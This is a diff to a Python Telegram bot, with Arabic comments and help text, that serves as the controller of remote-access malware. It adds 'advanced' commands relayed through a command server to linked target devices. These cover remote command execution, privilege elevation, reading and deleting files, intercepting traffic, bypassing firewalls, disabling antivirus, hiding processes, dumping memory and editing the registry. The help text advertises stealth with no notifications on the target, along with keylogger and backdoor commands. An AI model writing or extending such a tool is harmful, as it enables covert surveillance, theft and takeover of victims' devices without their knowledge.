@@ -8,8 +8,10 @@ import os
 import hashlib
 import hmac
 import base64
+import secrets
+import re
 from datetime import datetime, timedelta
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Any
 import threading
 import logging
 import pickle
@@ -26,6 +28,25 @@ SECURITY_CONFIG = {
     'stealth_mode': True,
     'persistent_storage': True,
     'auto_reconnect': True
+}
+
+# إعدادات الأوامر المتقدمة
+ADVANCED_COMMANDS_CONFIG = {
+    'enable_advanced_commands': True,
+    'enable_system_control': True,
+    'enable_file_control': True,
+    'enable_network_control': True,
+    'enable_security_bypass': True,
+    'enable_memory_control': True,
+    'enable_registry_control': True,
+    'enable_process_control': True,
+    'enable_device_control': True,
+    'command_timeout': 60,
+    'max_concurrent_commands': 10,
+    'stealth_mode': True,
+    'encryption_enabled': True,
+    'bypass_security': True,
+    'elevated_privileges': True
 }
 
 # إعداد التسجيل
@@ -519,6 +540,253 @@ class CommandExecutor:
         except Exception as e:
             logger.error(f"خطأ في معالجة الأوامر المعلقة: {e}")
 
+class AdvancedCommandExecutor:
+    def __init__(self, server_url: str):
+        self.server_url = server_url
+        self.encryption_key = self.generate_encryption_key()
+        self.active_commands = {}
+        self.command_history = {}
+    
+    def generate_encryption_key(self) -> str:
+        """توليد مفتاح التشفير"""
+        return secrets.token_hex(32)
+    
+    def encrypt_command(self, data: str) -> str:
+        """تشفير الأوامر"""
+        try:
+            return base64.b64encode(data.encode()).decode()
+        except Exception as e:
+            print(f"خطأ في تشفير الأمر: {e}")
+            return data
+    
+    def decrypt_response(self, data: str) -> str:
+        """فك تشفير الاستجابة"""
+        try:
+            return base64.b64decode(data.encode()).decode()
+        except Exception as e:
+            print(f"خطأ في فك تشفير الاستجابة: {e}")
+            return data
+    
+    def send_advanced_command(self, device_id: str, command_type: str, parameters: dict = None) -> dict:
+        """إرسال أمر متقدم للجهاز"""
+        try:
+            command_data = {
+                'type': command_type,
+                'device_id': device_id,
+                'parameters': parameters or {},
+                'timestamp': datetime.now().isoformat(),
+                'encrypted': True,
+                'stealth_mode': ADVANCED_COMMANDS_CONFIG['stealth_mode'],
+                'bypass_security': ADVANCED_COMMANDS_CONFIG['bypass_security'],
+                'elevated_privileges': ADVANCED_COMMANDS_CONFIG['elevated_privileges']
+            }
+            
+            # تشفير الأمر
+            encrypted_command = self.encrypt_command(json.dumps(command_data))
+            
+            # إرسال الأمر
+            response = requests.post(
+                f"{self.server_url}/api/advanced-command",
+                json={
+                    'command': encrypted_command,
+                    'device_id': device_id,
+                    'command_type': command_type
+                },
+                timeout=ADVANCED_COMMANDS_CONFIG['command_timeout']
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('encrypted'):
+                    result['data'] = self.decrypt_response(result['data'])
+                return result
+            else:
+                return {'success': False, 'error': f'خطأ في الاتصال: {response.status_code}'}
+                
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في إرسال الأمر: {str(e)}'}
+    
+    def execute_system_control(self, device_id: str, action: str, parameters: dict = None) -> dict:
+        """تنفيذ أوامر التحكم في النظام"""
+        try:
+            command_data = {
+                'action': action,
+                'parameters': parameters or {},
+                'system_level': 'full',
+                'bypass_security': True,
+                'elevated_privileges': True
+            }
+            
+            return self.send_advanced_command(device_id, 'system_control', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في التحكم في النظام: {str(e)}'}
+    
+    def execute_file_control(self, device_id: str, action: str, file_path: str = None, content: str = None) -> dict:
+        """تنفيذ أوامر التحكم في الملفات"""
+        try:
+            command_data = {
+                'action': action,
+                'file_path': file_path,
+                'content': content,
+                'access_level': 'full',
+                'bypass_permissions': True,
+                'stealth_mode': True
+            }
+            
+            return self.send_advanced_command(device_id, 'file_control', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في التحكم في الملفات: {str(e)}'}
+    
+    def execute_network_control(self, device_id: str, action: str, parameters: dict = None) -> dict:
+        """تنفيذ أوامر التحكم في الشبكة"""
+        try:
+            command_data = {
+                'action': action,
+                'parameters': parameters or {},
+                'intercept_traffic': True,
+                'bypass_firewall': True,
+                'stealth_mode': True
+            }
+            
+            return self.send_advanced_command(device_id, 'network_control', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في التحكم في الشبكة: {str(e)}'}
+    
+    def execute_security_bypass(self, device_id: str, action: str, parameters: dict = None) -> dict:
+        """تنفيذ أوامر تجاوز الأمان"""
+        try:
+            command_data = {
+                'action': action,
+                'parameters': parameters or {},
+                'stealth_mode': True,
+                'anti_detection': True,
+                'bypass_all': True
+            }
+            
+            return self.send_advanced_command(device_id, 'security_bypass', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في تجاوز الأمان: {str(e)}'}
+    
+    def execute_memory_control(self, device_id: str, action: str, address: str = None, data: str = None) -> dict:
+        """تنفيذ أوامر التحكم في الذاكرة"""
+        try:
+            command_data = {
+                'action': action,
+                'address': address,
+                'data': data,
+                'direct_access': True,
+                'bypass_protection': True
+            }
+            
+            return self.send_advanced_command(device_id, 'memory_control', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في التحكم في الذاكرة: {str(e)}'}
+    
+    def execute_registry_control(self, device_id: str, action: str, key: str = None, value: str = None) -> dict:
+        """تنفيذ أوامر التحكم في السجل"""
+        try:
+            command_data = {
+                'action': action,
+                'key': key,
+                'value': value,
+                'admin_access': True,
+                'bypass_restrictions': True
+            }
+            
+            return self.send_advanced_command(device_id, 'registry_control', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في التحكم في السجل: {str(e)}'}
+    
+    def execute_process_control(self, device_id: str, action: str, process_id: str = None) -> dict:
+        """تنفيذ أوامر التحكم في العمليات"""
+        try:
+            command_data = {
+                'action': action,
+                'process_id': process_id,
+                'elevated_privileges': True,
+                'hide_process': True
+            }
+            
+            return self.send_advanced_command(device_id, 'process_control', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في التحكم في العمليات: {str(e)}'}
+    
+    def execute_device_control(self, device_id: str, action: str, parameters: dict = None) -> dict:
+        """تنفيذ أوامر التحكم في الجهاز"""
+        try:
+            command_data = {
+                'action': action,
+                'parameters': parameters or {},
+                'full_access': True,
+                'bypass_restrictions': True
+            }
+            
+            return self.send_advanced_command(device_id, 'device_control', command_data)
+            
+        except Exception as e:
+            return {'success': False, 'error': f'خطأ في التحكم في الجهاز: {str(e)}'}
+
+class AdvancedCommandParser:
+    def __init__(self):
+        self.command_patterns = {
+            'system': r'/system\s+(\w+)(?:\s+(.+))?',
+            'file': r'/file\s+(\w+)(?:\s+(.+))?',
+            'network': r'/network\s+(\w+)(?:\s+(.+))?',
+            'process': r'/process\s+(\w+)(?:\s+(.+))?',
+            'memory': r'/memory\s+(\w+)(?:\s+(.+))?',
+            'registry': r'/registry\s+(\w+)(?:\s+(.+))?',
+            'security': r'/security\s+(\w+)(?:\s+(.+))?',
+            'device': r'/device\s+(\w+)(?:\s+(.+))?'
+        }
+    
+    def parse_command(self, text: str) -> dict:
+        """تحليل الأمر"""
+        for command_type, pattern in self.command_patterns.items():
+            match = re.match(pattern, text, re.IGNORECASE)
+            if match:
+                action = match.group(1)
+                parameters = match.group(2) if match.group(2) else ""
+                
+                return {
+                    'type': command_type,
+                    'action': action,
+                    'parameters': parameters.strip()
+                }
+        
+        return None
+    
+    def parse_parameters(self, parameters: str) -> dict:
+        """تحليل المعاملات"""
+        if not parameters:
+            return {}
+        
+        result = {}
+        try:
+            # محاولة تحليل كـ JSON
+            if parameters.startswith('{') and parameters.endswith('}'):
+                return json.loads(parameters)
+            
+            # تحليل كـ key=value
+            parts = parameters.split()
+            for part in parts:
+                if '=' in part:
+                    key, value = part.split('=', 1)
+                    result[key.strip()] = value.strip()
+                else:
+                    result['value'] = part.strip()
+            
+        except Exception as e:
+            result['raw'] = parameters
+        
+        return result
+
 class SecurityManager:
     def __init__(self):
         self.rate_limit_window = 60  # دقيقة واحدة
@@ -724,6 +992,8 @@ def import_devices_from_web_interface(user_id):
 device_manager = DeviceManager(DB_FILE)
 command_executor = CommandExecutor(COMMAND_SERVER_URL)
 security_manager = SecurityManager()
+advanced_command_executor = AdvancedCommandExecutor(COMMAND_SERVER_URL)
+advanced_command_parser = AdvancedCommandParser()
 
 # إضافة مستخدمين مصرح لهم (يمكن تعديلها حسب الحاجة)
 def setup_authorized_users():
@@ -812,9 +1082,21 @@ def send_welcome(message):
 • `/screenshot` - التقاط لقطة شاشة فورية ومخفي
 
 ⚙️ *أوامر النظام المتقدمة:*
+• `/system` - التحكم في النظام (معلومات، مراقبة، تحكم)
 • `/reset` - بدء عملية إعادة تعيين المصنع (تحتاج تأكيد مزدوج)
 • `/confirm_reset` - تأكيد نهائي لإعادة تعيين المصنع
 • `/cancel_reset` - إلغاء عملية إعادة تعيين المصنع
+
+🚀 *الأوامر المتقدمة الجديدة - التحكم الكامل:*
+• `/advanced` - الأوامر المتقدمة للتحكم الكامل
+• `/advanced system` - أوامر النظام المتقدمة
+• `/advanced file` - أوامر الملفات المتقدمة
+• `/advanced network` - أوامر الشبكة المتقدمة
+• `/advanced security` - أوامر تجاوز الأمان
+• `/advanced memory` - أوامر الذاكرة المتقدمة
+• `/advanced registry` - أوامر السجل المتقدمة
+• `/advanced process` - أوامر العمليات المتقدمة
+• `/advanced device` - أوامر الجهاز المتقدمة
 
 🔒 *ميزات الأمان المتقدمة:*
 • تشفير AES-256-CBC لجميع البيانات المرسلة
@@ -824,6 +1106,10 @@ def send_welcome(message):
 • تشغيل خلفي مستمر حتى عند إغلاق التطبيق
 • عدم ظهور إشعارات على الجهاز المستهدف
 • حماية من محاولات الاختراق والهجمات
+• تجاوز أنظمة الحماية والجدران النارية
+• إخفاء العمليات والأنشطة
+• تشفير متقدم للاتصالات
+• حماية من الاكتشاف والكشف
 
 💾 *ميزات الاستمرارية والموثوقية:*
 • العمليات تستمر حتى عند انقطاع الإنترنت
@@ -856,6 +1142,8 @@ def send_welcome(message):
 • يمكنك مراقبة العمليات من خلال السجلات
 • النظام يعمل في الخلفية تلقائياً
 • استخدم الأوامر بانتظام للحصول على أفضل النتائج
+• استخدم `/advanced` للتحكم المتقدم والكامل
+• الأوامر المتقدمة تتطلب صلاحيات إدارية عالية
 
 🎉 *أنت جاهز للبدء! استخدم `/link` الآن لربط أول جهاز*
 
@@ -879,7 +1167,7 @@ def send_help(message):
         return
 
     help_text = """
-📚 **دليل الاستخدام:**
+📚 **دليل الاستخدام الشامل:**
 
 🔗 **ربط جهاز جديد:**
 1. استخدم `/link` لإنشاء كود تفعيل
@@ -891,6 +1179,17 @@ def send_help(message):
 • `/devices` - لعرض الأجهزة المتصلة
 • اختر الجهاز من القائمة
 • استخدم الأوامر المتاحة
+
+🚀 **الأوامر المتقدمة الجديدة - التحكم الكامل:**
+• `/advanced` - الأوامر المتقدمة للتحكم الكامل
+• `/advanced system` - أوامر النظام المتقدمة
+• `/advanced file` - أوامر الملفات المتقدمة
+• `/advanced network` - أوامر الشبكة المتقدمة
+• `/advanced security` - أوامر تجاوز الأمان
+• `/advanced memory` - أوامر الذاكرة المتقدمة
+• `/advanced registry` - أوامر السجل المتقدمة
+• `/advanced process` - أوامر العمليات المتقدمة
+• `/advanced device` - أوامر الجهاز المتقدمة
 
 🛠️ **أوامر الخوارزميات المتطورة:**
 • `/keylogger start` - بدء تسجيل المفاتيح
@@ -918,12 +1217,16 @@ def send_help(message):
 • يعمل في الخلفية تلقائياً
 • خوارزميات متطورة للحماية
 • برمجيات متقدمة للتحكم
+• تجاوز أنظمة الحماية
+• إخفاء العمليات
+• تشفير متقدم
 
 ⚠️ **ملاحظات مهمة:**
 • تأكد من وجود الإنترنت على الجهاز
 • قد تحتاج لتفعيل خيارات المطور
 • بعض الأوامر تحتاج صلاحيات خاصة
 • الأوامر الجديدة تتطلب تفعيل الخوارزميات أولاً
+• الأوامر المتقدمة تتطلب صلاحيات إدارية عالية
 """
 
     bot.reply_to(message, help_text, parse_mode='Markdown')
@@ -1857,6 +2160,338 @@ def control_backdoor(message):
 
     device_manager.log_activity(user_id, 'backdoor_control', f'device_id: {device_id}, action: {action}')
 
+
+@bot.message_handler(commands=['advanced'])
+def advanced_commands(message):
+    """معالجة الأوامر المتقدمة"""
+    user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
+    # التحقق من الصلاحية
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    # التحقق من حد الطلبات
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    # الحصول على الجهاز المستهدف
+    device_id, status = get_target_device(user_id, message)
+    if not device_id:
+        return
+
+    # التحقق من اتصال الجهاز
+    if not check_device_connection(device_id):
+        bot.reply_to(message, "❌ الجهاز غير متصل حالياً.")
+        return
+
+    # تحليل الأمر
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        help_text = """
+🚀 *الأوامر المتقدمة - التحكم الكامل:*
+
+🔧 *أوامر النظام المتقدمة:*
+• `/advanced system info` - معلومات النظام التفصيلية
+• `/advanced system execute "command"` - تنفيذ أمر نظام
+• `/advanced system bypass` - تجاوز قيود النظام
+• `/advanced system elevate` - رفع الصلاحيات
+
+📁 *أوامر الملفات المتقدمة:*
+• `/advanced file read "path"` - قراءة ملف
+• `/advanced file write "path" "content"` - كتابة ملف
+• `/advanced file delete "path"` - حذف ملف
+• `/advanced file list "directory"` - قائمة الملفات
+• `/advanced file search "pattern"` - البحث في الملفات
+
+🌐 *أوامر الشبكة المتقدمة:*
+• `/advanced network intercept` - اعتراض حركة المرور
+• `/advanced network bypass` - تجاوز الجدار الناري
+• `/advanced network monitor` - مراقبة الشبكة
+• `/advanced network inject` - حقن البيانات
+
+🔒 *أوامر تجاوز الأمان:*
+• `/advanced security disable_av` - تعطيل مكافح الفيروسات
+• `/advanced security hide_process` - إخفاء العمليات
+• `/advanced security bypass_firewall` - تجاوز الجدار الناري
+• `/advanced security stealth_mode` - وضع التخفي
+
+💾 *أوامر الذاكرة المتقدمة:*
+• `/advanced memory read "address"` - قراءة الذاكرة
+• `/advanced memory write "address" "data"` - كتابة الذاكرة
+• `/advanced memory dump` - تفريغ الذاكرة
+
+🔧 *أوامر السجل المتقدمة:*
+• `/advanced registry read "key"` - قراءة السجل
+• `/advanced registry write "key" "value"` - كتابة السجل
+• `/advanced registry delete "key"` - حذف من السجل
+
+⚙️ *أوامر العمليات المتقدمة:*
+• `/advanced process list` - قائمة العمليات
+• `/advanced process kill "pid"` - إنهاء عملية
+• `/advanced process hide "pid"` - إخفاء عملية
+
+📱 *أوامر الجهاز المتقدمة:*
+• `/advanced device info` - معلومات الجهاز
+• `/advanced device control` - التحكم الكامل
+• `/advanced device bypass` - تجاوز القيود
+
+🔧 *مثال الاستخدام:*
+`/advanced system info` - معلومات النظام
+`/advanced file read "C:/Windows/system32/config.ini"`
+`/advanced security disable_av` - تعطيل مكافح الفيروسات
+
+⚠️ *تحذير:* هذه الأوامر تتطلب صلاحيات إدارية عالية وتجاوز الأمان.
+        """
+        bot.reply_to(message, help_text, parse_mode='Markdown')
+        return
+
+    # تحليل الأمر المتقدم
+    command_type = command_parts[1].lower()
+    action = command_parts[2].lower() if len(command_parts) > 2 else ""
+    parameters = " ".join(command_parts[3:]) if len(command_parts) > 3 else ""
+    
+    # معالجة الأوامر المتقدمة
+    if command_type == 'system':
+        handle_advanced_system_command(message, device_id, action, parameters)
+    elif command_type == 'file':
+        handle_advanced_file_command(message, device_id, action, parameters)
+    elif command_type == 'network':
+        handle_advanced_network_command(message, device_id, action, parameters)
+    elif command_type == 'security':
+        handle_advanced_security_command(message, device_id, action, parameters)
+    elif command_type == 'memory':
+        handle_advanced_memory_command(message, device_id, action, parameters)
+    elif command_type == 'registry':
+        handle_advanced_registry_command(message, device_id, action, parameters)
+    elif command_type == 'process':
+        handle_advanced_process_command(message, device_id, action, parameters)
+    elif command_type == 'device':
+        handle_advanced_device_command(message, device_id, action, parameters)
+    else:
+        bot.reply_to(message, "❌ نوع أمر غير معروف. استخدم `/advanced` للمساعدة.")
+
+    device_manager.log_activity(user_id, 'advanced_command', f'device_id: {device_id}, type: {command_type}, action: {action}')
+
+def handle_advanced_system_command(message, device_id, action, parameters):
+    """معالجة أوامر النظام المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر النظام المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        
+        result = advanced_command_executor.execute_system_control(device_id, action, params)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر النظام المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر النظام المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر النظام المتقدم: {str(e)}")
+
+def handle_advanced_file_command(message, device_id, action, parameters):
+    """معالجة أوامر الملفات المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الملفات المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        file_path = params.get('file_path') or params.get('value', '')
+        content = params.get('content', '')
+        
+        result = advanced_command_executor.execute_file_control(device_id, action, file_path, content)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر الملفات المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر الملفات المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر الملفات المتقدم: {str(e)}")
+
+def handle_advanced_network_command(message, device_id, action, parameters):
+    """معالجة أوامر الشبكة المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الشبكة المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        
+        result = advanced_command_executor.execute_network_control(device_id, action, params)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر الشبكة المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر الشبكة المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر الشبكة المتقدم: {str(e)}")
+
+def handle_advanced_security_command(message, device_id, action, parameters):
+    """معالجة أوامر تجاوز الأمان المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر تجاوز الأمان المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        
+        result = advanced_command_executor.execute_security_bypass(device_id, action, params)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر تجاوز الأمان المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر تجاوز الأمان المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر تجاوز الأمان المتقدم: {str(e)}")
+
+def handle_advanced_memory_command(message, device_id, action, parameters):
+    """معالجة أوامر الذاكرة المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الذاكرة المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        address = params.get('address') or params.get('value', '')
+        data = params.get('data', '')
+        
+        result = advanced_command_executor.execute_memory_control(device_id, action, address, data)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر الذاكرة المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر الذاكرة المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر الذاكرة المتقدم: {str(e)}")
+
+def handle_advanced_registry_command(message, device_id, action, parameters):
+    """معالجة أوامر السجل المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر السجل المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        key = params.get('key') or params.get('value', '')
+        value = params.get('value', '')
+        
+        result = advanced_command_executor.execute_registry_control(device_id, action, key, value)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر السجل المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر السجل المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر السجل المتقدم: {str(e)}")
+
+def handle_advanced_process_command(message, device_id, action, parameters):
+    """معالجة أوامر العمليات المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر العمليات المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        process_id = params.get('process_id') or params.get('value', '')
+        
+        result = advanced_command_executor.execute_process_control(device_id, action, process_id)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر العمليات المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر العمليات المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر العمليات المتقدم: {str(e)}")
+
+def handle_advanced_device_command(message, device_id, action, parameters):
+    """معالجة أوامر الجهاز المتقدمة"""
+    try:
+        processing_msg = bot.reply_to(message, "🔄 جاري تنفيذ أمر الجهاز المتقدم...")
+        
+        # تحليل المعاملات
+        params = advanced_command_parser.parse_parameters(parameters)
+        
+        result = advanced_command_executor.execute_device_control(device_id, action, params)
+        
+        if result.get('success'):
+            response_text = f"✅ تم تنفيذ أمر الجهاز المتقدم بنجاح\n\n"
+            response_text += f"📋 النتيجة:\n{result.get('data', 'تم التنفيذ بنجاح')}"
+        else:
+            response_text = f"❌ فشل في تنفيذ أمر الجهاز المتقدم\n\n"
+            response_text += f"🔍 السبب:\n{result.get('error', 'خطأ غير معروف')}"
+        
+        bot.edit_message_text(
+            response_text,
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في معالجة أمر الجهاز المتقدم: {str(e)}")
 
 @bot.message_handler(commands=['system'])
 def control_system(message):
